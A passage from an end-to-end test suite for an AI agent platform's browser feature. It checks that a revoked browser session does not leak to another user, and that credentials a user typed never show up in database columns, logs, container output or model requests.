  expect(again.reply).toContain("Signed in");
  // Sam revokes: the page that had it loaded ends.
  const revoked = await sam.delete(`/api/v1/browser-sessions/${journey.sessionId}`);
  expect(revoked.status()).toBe(204);
  journey.privateUntil = Date.now();
  const anaLive = liveSockets.ana;
  if (anaLive) {
    const during = anaLive.frames.filter((t) => t >= journey.takeAt && t < journey.privateUntil);
    journey.anaFrames = during;
    anaLive.close();
  }
  const after = await ask(
    sam,
    journey.dm,
    `once more ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
    "ocw_browser_open",
  );
  expect(after.reply).toContain(`Opened ${PANEL}`);
  expect(after.reply).not.toContain("Signed in");
  // Ana's own DM with Guide never loads Sam's session.
  const anaDm = await ana.post(`/api/v1/agents/${journey.guideId}/dm`);
  journey.anaDm = ((await anaDm.json()) as { dmId: string }).dmId;
  const theirs = await ask(
    ana,
    journey.anaDm,
    `mine ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
    "ocw_browser_open",
  );
  expect(theirs.reply).not.toContain("Signed in");
  // Frames again: Ana watches the page Sam's DM has open now (no session loaded), and receives frames.
  const { rows } = await asSuperuser<{ id: string }>(
    "select id from app.browser_contexts where agent_id = $1 and conversation_id = $2 and closed_at is null order by opened_at desc limit 1",
    [journey.guideId, journey.dm],
  );
  const watch = await liveSocket(ana, rows[0]?.id as string);
  try {
    await expect.poll(() => watch.frames.length, { timeout: 20_000 }).toBeGreaterThan(0);
  } finally {
    watch.close();
  }
  expect(journey.anaFrames, "Ana's frames while Sam controlled the page or his session was loaded").toEqual(
    [],
  );
  expect(journey.otherDeviceFrames, "Sam's other device's frames during the takeover").toEqual([]);
  await ana.dispose();
  await sam.dispose();
  record();
  passed(9);
});

test("10. E1: none of the four strings Sam typed is in any column, audit row, stream event, log or model request", async () => {
  test.setTimeout(REAL);
  const needles = [E1.username, E1.password, E1.otp, E1.revealed];
  // Every text-like column of every table (the sealed secret's ciphertext aside: it is the encrypted state itself).
  const cols = await asSuperuser<{ table_schema: string; table_name: string; column_name: string }>(
    `select table_schema, table_name, column_name from information_schema.columns
      where table_schema in ('app', 'auth')
        and (data_type in ('text', 'jsonb', 'json', 'character varying') or udt_name in ('_text', '_varchar'))`,
    [],
  );
  const found: string[] = [];
  for (const c of cols.rows) {
    if (c.table_schema === "app" && c.table_name === "secrets" && c.column_name === "ciphertext") continue;
    for (const needle of needles) {
      const n = await asSuperuser<{ n: number }>(
        `select count(*)::int as n from "${c.table_schema}"."${c.table_name}" where "${c.column_name}"::text like $1`,
        [`%${needle}%`],
      );
      if ((n.rows[0]?.n ?? 0) > 0)
        found.push(`${c.table_schema}.${c.table_name}.${c.column_name}: ${needle}`);
    }
  }
  expect(found).toEqual([]);
  const runDir = process.env.OCW_E2E_RUN_DIR ?? "";
  const texts: Array<[string, string]> = [];
  const noLog: string[] = [];
  for (const f of ["api.log", "sandboxd.log"]) {
    const p = join(runDir, f);
    expect(existsSync(p), `${f} exists`).toBe(true);
    texts.push([f, readFileSync(p, "utf8")]);
  }
  const brw = docker(
    "ps",
    "-aq",
    "--filter",
    `label=ocw.namespace=${NS}`,
    "--filter",
    "label=ocw.kind=brw",
    "--filter",
    `label=ocw.agent=${journey.guideId}`,
  )
    .split("\n")
    .filter(Boolean);
  expect(brw.length, "Guide's brw container").toBeGreaterThan(0);
  // The brw and egress containers keep no log at all (sandboxd creates them with the `none` log driver): there is no
  // output to read, which is checked instead (a driver that kept one would be read and swept here).
  for (const id of [...brw, `ocw-egress-${NS}`]) {
    const driver = docker("inspect", "-f", "{{.HostConfig.LogConfig.Type}}", id);
    if (driver === "none") {
      noLog.push(id);
      continue;
    }
    texts.push([
      `container ${id}`,
      execFileSync("docker", ["logs", id], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }),
    ]);
  }
  expect(noLog.length + texts.length).toBeGreaterThan(2);
  texts.push([
    "cell",
    execFileSync("docker", ["logs", process.env.OCW_PROOF_CELL ?? ""], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
    }),
  ]);
  const dir = process.env.OCW_PROOF_CAPTURE_DIR ?? "";
  const captures = readdirSync(dir).filter((f) => f.endsWith(".json"));
  expect(captures.length, "the model requests of the run").toBeGreaterThan(0);
  for (const f of captures) texts.push([`model ${f}`, readFileSync(join(dir, f), "utf8")]);
  const leaks = texts.flatMap(([where, text]) =>
    needles.filter((n) => text.includes(n)).map((n) => `${where}: ${n}`),
  );
  console.log(
    `[proof] E1 sweep: ${cols.rows.length} columns, ${texts.length} logs and model requests; no log kept by ${noLog.length} container(s) (brw, egress)`,
  );
  expect(leaks).toEqual([]);
  passed(10);
});
